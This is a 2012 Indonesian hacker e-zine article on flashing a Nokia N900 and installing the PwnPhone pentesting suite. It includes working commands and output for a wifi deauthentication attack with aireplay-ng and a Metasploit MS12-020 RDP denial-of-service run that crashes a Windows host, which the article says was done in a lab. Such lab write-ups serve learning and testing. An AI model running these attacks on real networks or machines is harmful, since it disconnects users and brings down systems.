ECHO MAGAZINE VOLUME X, ISSUE XXV, PHILE 0x08.TXT
__________       ______  __       __________________               
___  ____/__________  / / /______ ____  /___  /___(_)_______ _____ 
__  __/   _  ___/__  /_/ / _  __ \___  / __  / __  / __  __ \_  _ \
_  /___   / /__  _  __  /  / /_/ /__  /  _  /___  /  _  / / //  __/
/_____/   \___/  /_/ /_/   \____/ _  /   /____//_/   /_/ /_/ \___/ 
                                  /_/
  Mobile Pentesting Suite : Nokia N900 PwnPhone 
  Budi Khoirudin
  http://budi.khoirudin.com

-----[ Disclaimer
	
Tulisan ini dibuat untuk tujuan pendidikan apabila pembaca memiliki tujuan
negatif, berbahaya, atau merugikan harap hentikan membaca dan tutup e-zine
ini.Segala sesuatu yang saya lakukan disini dilakukan didalam private lab tanpa
merugikan siapapun.Kepada para pembaca e-zine ini apabila pembaca ingin mencoba
atau mempraktekan dengan apa yang saya tulis, penulis tidak bertanggung jawab
atas resiko yang disebabkan dan resiko tersebut ditanggung oleh pembaca
sendiri.
	
-----[ Pendahuluan

Bismillah,
	
Pada awalnya saya bingung apa yang akan saya tulis untuk CFP ECHO E-zine kali
ini, awal saya ingin membawakan materi tentang hardware moding tapi karena saya
risetnya mood-mood'an (baca: tidak konsisten) jadi tidak saya lanjutkan. Lalu
saya mendengar issue tentang IDSECCONF 2012 yang akan bertema "Mobile Hacking"
dari situ saya teringat akan macam-macam bentuk mobile pentesting suite,
seperti contohnya pada lingkungan ANDROID ada ANTI(Android Network Toolkit)[1],
Droidsheep[2], Debdroid[3], dan lainnya lalu pada lingkungan IOS (Iphone OS)[4]
banyak sekali mungkin beberapa tools seperti metasploit, nmap, ettercap
berjalan dengan baik didalam device ini, dan ada juga yang sudah menyediakan
repository untuk tools-tools tersebut[5]. Keduanya sudah pernah saya oprek dari
kedua device tersebut sama-sama memiliki kekurangan salah satunya ialah
"Wireless Packet Injection". Berangkat dari kekurangan tersebut saya mencoba
mencari tau, apakah ada mobile phone yang bisa melakukan hal tersebut? ternyata
ada, ialah Nokia N900 yang memiliki OS maemo 5, namun untuk mengaktifkan hal
tersebut harus dilakukan beberapa modifikasi[6].Semoga tulisan ini bisa menjadi
"Kick Starter" pada materi-materi yang akan dipresentasikan oleh para pemateri
IDSECCONF 2012, :) Cahyo.... 
	
Selanjutnya saya melakukan riset lebih lanjut, apakah Nokia N900 tersebut hanya
sekedar melakukan "Wireless Hacking"? sedangkan OS yang dipakai ialah maemo 5
yang merupakan base on linux, pasti ada hal lebih yang dapat dilakukan.
Bagaimana dengan metasploit? apakah bisa berjalan didalam nokia N900? ternyata
bisa berjalan didalam device ini[7].Bagaimana dengan tools-tools hacking
lainnya? setelah melakukan pencarian lebih jauh akhirnya saya temukan PwnPhone
yang dibuat oleh "pwnieexpress"[8] didalam releasenya terdapat 2 versi yaitu
versi komersil yang sudah dibundle dengan Nokia N900 yang dijual seharga $960
(Wow mahal bangets untuk handphone jadul keluaran tahun 2009) dan versi
komunitas yang dapat didownload secara gratis. Perbedaan antara versi komersil
dan komunitas menurut saya tidak terlalu signifikan dikarenakan lebih kearah
support dan update[9].
	
Dimulailah perburuan Nokia N900, flashback sedikit untuk sekedar sharing
beberapa waktu lalu saya menjual IPOD 4G serta Netbook ASUS saya, tujuannya
ialah untuk menabung untuk dapat membeli Macbook Pro, namun ditengah perjalanan
saya melihat beberapa teman-teman sudah memiliki sertifikasi international dari
situ saya sadar betapa pentingnya sertifikasi international tersebut. Maksud
diri ingin ikut pelatihan serta ujian sertifikasi international tersebut namun
Mood buat oprek Nokia N900 ini lagi menggebu-gebu dan saya ingin berbagi ilmu
dari apa yang saya oprek ini kepada para pembaca semua, yang pada akhirnya saya
membeli Nokia N900 tersebut, jadi hargailah mereka yang sudah berkorban banyak
untuk mendapatkan ilmu lalu dibagikan secara gratis, bukannya untuk dihina,
direndahkan, dicacimaki, ataupun dengan menyerang orang tersebut.Demikian mari
kita kembali lagi kebenang merah (gaya OVJ) ...

-----[ Flashing Nokia N900

Nah berhubung saya beli ini alat second atau bekas, jadinya mesti dibuat
menjadi kondisi awal seperti keluar dari pabrik, biar bersih tidak ada
bekas-bekas yang tertinggal dari pengguna yang lama yaitu dengan melakukan
flashing dan ini sangat disarankan oleh pihak pwnieexpress[15].Operating System
yang saya pakai pada saat melakukan flashing ini ialah windows 7 dan aplikasi
untuk melakukan flashingnya ialah flasher-3.5 yang dapat di download di
http://tablets-dev.nokia.com/maemo-dev-env-downloads.php , untuk bagaimana cara
menginstall flashernya, cukup mudah bagi pengguna windows mungkin hanya tinggal
mengklik next dan finish.

Berikut ini opsi yang dimiliki oleh flasher-3.5:
		C:\Program Files\maemo\flasher-3.5>flasher-3.5.exe
		flasher v2.5.2 (Sep 24 2009)

		Nothing to do!
		Usage: flasher [OPTIONS]
		Options:
		  -F, --fiasco=ARG            Location of a FIASCO image
		  -k, --kernel=ARG            Location of kernel image
		  -n, --initfs=ARG            Location of initfs image
		  -r, --rootfs=ARG            Location of root JFFS2 image
			  --cmt-2nd=ARG           Location of CMT FIASCO 2nd image
			  --cmt-algo=ARG          Location of CMT FIASCO algorithm image
			  --cmt-mcusw=ARG         Location of CMT FIASCO MCUSW image
			  --cmt-no-verify         Disable verification of CMT programming
		  -x, --xloader=ARG           Location of X-Loader image
		  -s, --secondary=ARG         Location of NOLO secondary bootloader image
		  -2, --2nd=ARG               Location of NOLO cold flasher ("2nd") image
		  -u, --unpack[=ARG]          Unpack a FIASCO image
		  -f, --flash                 Load and flash all supplied images
		  -l, --load                  Only load all supplied images
		  -b, --boot[=ARG]            Boot the kernel with optional cmdline
		  -R, --reboot                Reboot the board (e.g. after flashing NOLO)
		  -i, --read-device-id        Print out the device type
		  -S, --serial-port=ARG       Serial port used for cold flashing or "usb"
		  -I, --init-port             Only initialize the serial port
		  -c, --cold-flash            "Cold flash" the device
		  -h, --hw-revision=ARG       Specify product code and HW revision
			  --enable-rd-mode        Enable R&D mode on the device
			  --disable-rd-mode       Disable R&D mode on the device
			  --set-rd-flags[=ARG]    Set R&D mode flags on the device
			  --clear-rd-flags[=ARG]  Clear R&D mode flags on the device
			  --query-rd-mode         Query the device R&D mode status and flags
			  --set-hw-revision[=ARG] Set HW revision override on device
			  --flash-only=ARG        Flash only certain components
		  -U, --usb-device=ARG        Specify USB device to use (bus:device address)
	
    Selanjutnya yang kita lakukan ialah flashing eMMC (embedded MMC) a.k.a
    *VANILLA*[10].Kegunaan melakukan hal ini ialah untuk membersihkan
    konten-kontent yang terdapat pada partisi internal memory sebesar 32GB
    tersebut. sebelum kita mulai melakukan flashing kita download dulu eMMC
    imagenya di http://tablets-dev.nokia.com/nokia_N900.php lalu ditempatkan di
    path folder dimana kita menginstall flasher-3.5, secara default path
    direktorinya ialah "C:\Program Files\maemo\flasher-3.5".selanjutnya kita
    matikan handphone nokia n900 tersebut, setelah kondisi mati. sebelum kita
    memasang kabel data yang menghubungkan antara handphone dan pc, kita buka
    terlebih dahulu command prompt (CMD), pindah ke direktori dimana kita
    menginstall flasher-3.5 dan ikuti langkah dibawah ini:
	
    C:\Program Files\maemo\flasher-3.5>flasher-3.5.exe -F RX-51_2009SE_10.2010.13-2.VANILLA_PR_EMMC_MR0_ARM.bin -f 
    <---- tekan enter tanpa menghubungkan kabel data antara handphone dan pc
		flasher v2.5.2 (Sep 24 2009)

		Image 'mmc', size 255947 kB
				Version RX-51_2009SE_10.2010.13-2.VANILLA
		Suitable USB device not found, waiting. 
    <------------- disini kabel data belum dihubungkan antara handphone dan pc
		USB device found found at bus bus-0, device address \\.\libusb0-0001--0x0421-0x0 
    <------ nah pada bagian ini, sambil menekan dan menahan tombol "U" pada 
            keyboard handphone (Nokia N900) kita sambungkan kabel data tersebut 
            antara handphone dan pc, jangan lepaskan tombol "U" tersebut sampai selesai.
		105.
		Found device RX-51, hardware revision 2101
		NOLO version 1.4.14
		Version of 'sw-release': RX-51_2009SE_21.2011.38-1_PR_MR0
		Booting device into flash mode.
		Suitable USB device not found, waiting.
		USB device found found at bus bus-0, device address \\.\libusb0-0001--0x0421-0x0
		1c8.
		Raw data transfer EP found at EP2.
		Image(s) flashed successfully in 27.429 s (9331 kB/s)! 
    <------ nah pada bagian ini yang berarti kita telah berhasil melakukan 
            flashing eMMC dan barulah kita lepaskan tombol "U" pada keyboard handphone 
            (Nokia N900) biarkan handphone dalam keadaan mati.

    Okay sebelumnya kita telah berhasil melakukan flashing eMMC lalu yang kita
    lakukan selanjutnya ialah flashing FIASCO a.k.a *COMBINED*[10] atau
    rootfs.Kegunaan dari melakukan flashing FIASCO ialah memasang kembali
    kernel, gsm firmware, bootloader, dan emplementasi dari linux itu
    sendiri[11] yang menjadikan handphone nokia N900 tersebut kembali ke
    kondisi awal. Seperti pada saat melakukan flashing eMMC kita terlebih
    dahulu mendownload file image FIASCO dan ditempatkan di path direktori
    tempat menginstall flasher-3.5. Apabila kabel data antara handphone dan pc
    tersambung kita putuskan terlebih dahulu sambungan tersebut lalu ketikan
    pada command prompt seperti yang tertera dibawah ini:
		
    C:\Program Files\maemo\flasher-3.5>flasher-3.5.exe -F RX-51_2009SE_20.2010.36-2_PR_COMBINED_MR0_ARM.bin -f -R
	flasher v2.5.2 (Sep 24 2009)

	SW version in image: RX-51_2009SE_20.2010.36-2_PR_MR0
	Image 'kernel', size 1705 kB
			Version 2.6.28-20103103+0m5
	Image 'rootfs', size 185728 kB
			Version RX-51_2009SE_20.2010.36-2_PR_MR0
	Image 'cmt-2nd', size 81408 bytes
			Version BB5_09.36
	<---SNIP--->
	Dipotong karena kepanjangan
	<---SNIP--->
	Image 'xloader', size 14848 bytes
			Valid for RX-51: 2601, 2602, 2603, 2604, 2605, 2606
			Version 1.4.14.9+0m5
	Image 'secondary', size 109440 bytes
			Valid for RX-51: 2601, 2602, 2603, 2604, 2605, 2606
			Version 1.4.14.9+0m5
	Suitable USB device not found, waiting. 
    <---- disini kabel data antara handphone dan pc belum tersambung
	USB device found found at bus bus-0, device address \\.\libusb0-0001--0x0421-0x0 
    <--- sambil menekan dan menahan tombol "U" pada keyboard (Nokia N900) lalu 
         sambungkan kabel data tersebut yang menghubungkan antara pc dan handphone
	105.
	Found device RX-51, hardware revision 2101
	NOLO version 1.4.14
	Version of 'sw-release': RX-51_2009SE_21.2011.38-1_PR_MR0
	Sending xloader image (14 kB)...
	100% (14 of 14 kB, avg. 2900 kB/s)
	Sending secondary image (106 kB)...
	100% (106 of 106 kB, avg. 10687 kB/s)
	Flashing bootloader... done.
	<---SNIP--->
	Dipotong karena kepanjangan
	<---SNIP--->
	Sending and flashing rootfs image (185728 kB)...
	100% (185728 of 185728 kB, avg. 12228 kB/s)
	Finishing flashing... done
	CMT flashed successfully 

	C:\Program Files\maemo\flasher-3.5>
	
    Akhirnya kita berhasil melakukan flashing Nokia N900, biarkan handphone
    melakukan reboot karena kita sebelumnya sudah memberikan opsi "-R" yang
    berarti reboot setelah selesai.
	
-----[ Installasi PwnPhone

    Setelah kita berhasil melakukan flashing, yang kita lakukan selanjutnya
    ialah melakukan instalasi bundle PwnPhone tersebut kedalam Nokia
    N900.Bundle Pwnphone versi komunitas tersebut dapat didownload di
    http://pwnieexpress.com/downloads.html. untuk instruksi instalasi sudah
    disediakan oleh pwnieexpress yang terdapat disini
    http://pwnieexpress.com/support/pwnphone_community_install.txt pembaca
    tinggal mengikutinya saja, saran dari saya pastikan baterai handphone
    terisi penuh, mungkin pada saat instalasi PwnPhone ini seolah-olah
    handphone kita hang atau crash namun sebenarnya saat itu sedang melakukan
    proses dan selanjutnya janganlah melakukan upgrade pada kernel power
    tersebut ke versi yang lebih tinggi dikarenakan dapat menghilangkan fitur
    "packet injection", defaultnya adalah kernel power versi 46.

-----[ PwnPhone In Action
	
    Banyak sekali tools-tools[12] yang disediakan oleh PwnPhone beberapa
    diantara ialah:
    
    - Metasploit, Fasttrack, SET, Scapy, Nikto, SSLstrip, iodine
    - Kismet, Aircrack-NG, Wifite, Wifizoo, GrimWEPa, Wepbuster
    - Nmap, netcat, tcpdump, wireshark, tshark, Ettercap-NG, exploitDB,
      macchanger
    - presencevnc client, x11vnc server, conky, tor, rdesktop, openvpn, netmon,
      iptables
	
    Salah satu bentuk emplementasi dari packet injection ialah deauth
    packet[14], bagaimana cara melakukannya dengan Nokia N900 yang sudah
    terpasang PwnPhone? berikut POCnya:
	
    - Mengaktifkan Mode Monitor dengan klik icon "orang pakai kacamata" /
      monitor_on_off nanti akan keluar status "Monitor mode ENABLED!"
    - Mengaktifkan Packet Injection dengan klik icon "suntikan dengan
      background warna putih" / Injection_ON nanti akan keluar status
      "Injection is enabled );"
    - Klik Icon X-terminal selanjutnya ikuti langkah dibawah ini:
	
	BusyBox v1.19.2 (Debian 1.19.2power1) built-in shell (ash)
	Enter 'help' for a list of built-in commands.
	
	~ $ root
	
	BusyBox v1.19.2 (Debian 1.19.2power1) built-in shell (ash)
	Enter 'help' for a list of built-in commands.

	Nokia-N900:~# id
	uid=0(root) gid=0(root) groups=0(root),20(dialout),29(audio),44(video),670(pulse-access)
	Nokia-N900:~# uname -a
	Linux Nokia-N900 2.6.28.10power46-wl1 #1 PREEMPT Sun Dec 19 20:51:27 CET 2010 armv7l GNU/Linux

	- Melakukan monitoring 
		Nokia-N900:~# airodump-ng mon0
		
		CH  2 ][ Elapsed: 28 s ][ 2012-03-23 09:10

		BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

		F4:C7:14:XX:XX:XX  -59      153     5856  212   6  54e  OPN              AndroidAP

		BSSID              STATION            PWR   Rate    Lost  Packets  Probes

		F4:C7:14:XX:XX:XX  EC:9B:5B:XX:XX:XX    0   48e- 0e     1     2971
		F4:C7:14:XX:XX:XX  4C:ED:DE:XX:XX:XX  -58   54e-54e    21     3104
		
        Dari sini dapat kita lihat terdapat 1 AP (Access Point) dengan 2 client
        yang terhubung. close aplikasi tersebut CTRL + C
		
	- Testing apakah Injection dapat dilakukan?
		Nokia-N900:~# aireplay-ng --test -a F4:C7:14:17:C5:E6 wlan0
		10:00:35  Waiting for beacon frame (BSSID: F4:C7:14:17:C5:E6) on channel 6
		10:00:35  Trying broadcast probe requests...
		10:00:35  Injection is working!
		10:00:37  Found 1 AP 

		10:00:37  Trying directed probe requests...
		10:00:37  F4:C7:14:17:C5:E6 - channel: 6 - 'AndroidAP'
		10:00:37  Ping (min/avg/max): 1.496ms/10.387ms/41.168ms Power: -56.93
		10:00:37  30/30: 100%
	
	- Deauth Packet In Action:
		Nokia-N900:~# aireplay-ng --deauth 10 -a F4:C7:14:17:C5:E6 wlan0 
		10:01:26  Waiting for beacon frame (BSSID: F4:C7:14:17:C5:E6) on channel 6
		NB: this attack is more effective when targeting
		a connected wireless client (-c <client's mac>).
		10:01:26  Sending DeAuth to broadcast -- BSSID: [F4:C7:14:17:C5:E6]
		10:01:26  Sending DeAuth to broadcast -- BSSID: [F4:C7:14:17:C5:E6]
		10:01:27  Sending DeAuth to broadcast -- BSSID: [F4:C7:14:17:C5:E6]
		10:01:27  Sending DeAuth to broadcast -- BSSID: [F4:C7:14:17:C5:E6]
		10:01:28  Sending DeAuth to broadcast -- BSSID: [F4:C7:14:17:C5:E6]
		10:01:28  Sending DeAuth to broadcast -- BSSID: [F4:C7:14:17:C5:E6]
		10:01:29  Sending DeAuth to broadcast -- BSSID: [F4:C7:14:17:C5:E6]
		10:01:29  Sending DeAuth to broadcast -- BSSID: [F4:C7:14:17:C5:E6]
		10:01:30  Sending DeAuth to broadcast -- BSSID: [F4:C7:14:17:C5:E6]
		10:01:30  Sending DeAuth to broadcast -- BSSID: [F4:C7:14:17:C5:E6]
		
    - Menonaktifkan Mode Monitor dengan klik icon "orang pakai kacamata" /
      monitor_on_off nanti akan keluar status "Monitor mode DISABLED!"
	
    - Menonaktifkan Packet Injection dengan klik icon "suntikan dengan
      background warna hitam" / Injection_OFF nanti akan keluar status "Turning
      Injection Off,Injection is disabled );"
	
    Aksi lainnya melakukan exploitasi dengan metasploit yang terdapat pada
    Nokia N900 PwnPhone ini.Berhubung beberapa waktu lalu sedang marak-maraknya
    issue tentang kelemahan yang terdapat pada fitur RDP yang dimiliki oleh
    mesin Windows yaitu MS12-020 / CVE-2012-0002 maka dari itu bermunculanlah
    bentuk POC yang menyebabkan target menjadi BSOD (Blue Screen Of Death) dan
    Team dari metasploit itu sendiri telah berhasil melakukan porting bentuk
    POC tersebut menjadi module yang terdapat pada metasploit. Sedikit info
    pada saat tulisan ini dibuat pihak metasploit akan memberikan hadiah berupa
    uang kurang lebih sebesar $15000[13] bagi siapapun yang dapat membuat
    module exploit yang menghasilkan RCE (Remote Code Execution) pada kelemahan
    tersebut.Baiklah sekarang kita coba emplementasikan metasploit dengan
    menggunakan module DOS sebagai bentuk emplementasi dari kelemahan tersebut,
    mari kita coba pada Nokia N900 PwnPhone, berikut POCnya: Klik Icon
    X-terminal selanjutnya ikuti langkah dibawah ini:
	
	BusyBox v1.19.2 (Debian 1.19.2power1) built-in shell (ash)
	Enter 'help' for a list of built-in commands.
	
	~ $ root
	
	BusyBox v1.19.2 (Debian 1.19.2power1) built-in shell (ash)
	Enter 'help' for a list of built-in commands.

	Nokia-N900:~# id
	uid=0(root) gid=0(root) groups=0(root),20(dialout),29(audio),44(video),670(pulse-access)
	Nokia-N900:~# uname -a
	Linux Nokia-N900 2.6.28.10power46-wl1 #1 PREEMPT Sun Dec 19 20:51:27 CET 2010 armv7l GNU/Linux
	Nokia-N900:~# ls
	Nokia-N900:~# pwd
	/root
	Nokia-N900:~# cd /home/user/MyDocs/pwnphone/msf3/
	Nokia-N900:/home/user/MyDocs/pwnphone/msf3#
	Nokia-N900:/home/user/MyDocs/pwnphone/msf3# ruby msfconsole
	 _                                                      _
	/  \  / \        __                          _   __    /_/ __
	| |\ /  | _____  \ \            ___   _____ | | /   \  _   \ \
	| | \/| | | ___\ |- -|   /\    / __\ | -__/ | | | |  || | |- -|
	|_|   | | | _|__  | |_  / -\ __\ \   | |    | |_ \__/ | |  | |_
		  |/  |____/  \___\/ /\  \___/   \/      \__|     |_\  \___\


		   =[ metasploit v4.3.0-dev [core:4.3 api:1.0]
	+ -- --=[ 818 exploits - 458 auxiliary - 138 post
	+ -- --=[ 249 payloads - 27 encoders - 8 nops

	msf > use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
	msf  auxiliary(ms12_020_maxchannelids) > show options

	Module options (auxiliary/dos/windows/rdp/ms12_020_maxchannelids):

	   Name   Current Setting  Required  Description
	   ----   ---------------  --------  -----------
	   RHOST                   yes       The target address
	   RPORT  3389             yes       The target port

	msf  auxiliary(ms12_020_maxchannelids) > nmap -v -sT -O -p 3389 192.168.43.165
	[*] exec: nmap -v -sT -O -p 3389 192.168.43.165


	Starting Nmap 5.50 ( http://nmap.org ) at 2012-03-23 08:56 WIT
	Initiating ARP Ping Scan at 08:56
	Scanning 192.168.43.165 [1 port]
	Completed ARP Ping Scan at 08:56, 0.05s elapsed (1 total hosts)
	Initiating Parallel DNS resolution of 1 host. at 08:56
	Completed Parallel DNS resolution of 1 host. at 08:56, 0.01s elapsed
	Initiating Connect Scan at 08:56
	Scanning 192.168.43.165 [1 port]
	Discovered open port 3389/tcp on 192.168.43.165
	Completed Connect Scan at 08:56, 0.01s elapsed (1 total ports)
	Initiating OS detection (try #1) against 192.168.43.165
	Nmap scan report for 192.168.43.165
	Host is up (0.052s latency).
	PORT     STATE SERVICE
	3389/tcp open  ms-term-serv
	MAC Address: 4C:ED:DE:XX:XX:XX (Unknown)
	Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
	Device type: general purpose
	Running: Microsoft Windows XP|2003
	OS details: Microsoft Windows XP SP2 or Server 2003 SP1 or SP2
	Network Distance: 1 hop
	TCP Sequence Prediction: Difficulty=261 (Good luck!)
	IP ID Sequence Generation: Incremental

	Read data files from: /usr/share/nmap
	OS detection performed. Please report any incorrect results at http://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 6.32 seconds
			   Raw packets sent: 17 (1.446KB) | Rcvd: 17 (1.222KB)
	msf  auxiliary(ms12_020_maxchannelids) > set RHOST 192.168.43.165
	RHOST => 192.168.43.165
	msf  auxiliary(ms12_020_maxchannelids) > show options

	Module options (auxiliary/dos/windows/rdp/ms12_020_maxchannelids):

	   Name   Current Setting  Required  Description
	   ----   ---------------  --------  -----------
	   RHOST  192.168.43.165   yes       The target address
	   RPORT  3389             yes       The target port

	msf  auxiliary(ms12_020_maxchannelids) > run

	[*] 192.168.43.165:3389 - Sending MS12-002 Microsoft Remote Desktop Use-After-Free DoS
	[*] 192.168.43.165:3389 - 210 bytes sent
	[*] 192.168.43.165:3389 - Checking RDP status...
	[+] 192.168.43.165:3389 seems down
	[*] Auxiliary module execution completed
	msf  auxiliary(ms12_020_maxchannelids) >

    Alhamdulilah, demikianlah tulisan ini saya buat semoga dapat bermanfaat
    buat para pembaca yang budiman, apabila ada kekurangan dan kata-kata yang
    kurang berkenan maafkanlah saya, saya hanya manusia biasa yang tak luput
    dari kesalahan. Well, sampai ketemu lagi ...
	
-----[ Shouts
	
	- Allah SWT, nabi beserta rasulnya
	- Member JKT48, AKB48, dan Cherrybelle
	- Nyubicrew : Nyubi, Matdhule, Bius, Parcom, Awie dan semua Crew
	- ECHO : Om Hero, Ammar, Dedi, Om Mulyadi, Azis, Tenro dan semua Member
	- RNDC, Antihackerlink : Om Arip SakitJiwa, Murray, Arif Dewae, Kendi,
      	  Faco, Admin AHREPOST dan teman-teman semua
    	- Buat kalian Gadis Kawaii dimanapun kalian berada
	
-----[ Referensi
	
	1. http://zimperium.com/Android_Network_Toolkit.html
	2. http://droidsheep.de/
	3. http://gitbrew.org/debdroid/
	4. http://kecoak.org/log/2010/12/21/iphone4-network-hacking-arsenal-in-your-pocket/
	5. http://ininjas.com/forum/index.php
	6. http://www.neopwn.com/
	7. https://community.rapid7.com/docs/DOC-1295
	9. http://pwnieexpress.com/downloads.html
	10. http://wiki.maemo.org/Updating_the_tablet_firmware#Updating_.26_Flashing_your_device
	11. http://wiki.maemo.org/Updating_the_tablet_firmware#What_does_it_do.3F
	12. http://pwnieexpress.com/pdfs/pwnphonemanual.pdf
	13. http://gun.io/open/48/metasploit-module-for-cve-2012-002
	14. http://www.aircrack-ng.org/doku.php?id=deauthentication
	15. http://pwnieexpress.com/support/pwnphone_community_install.txt
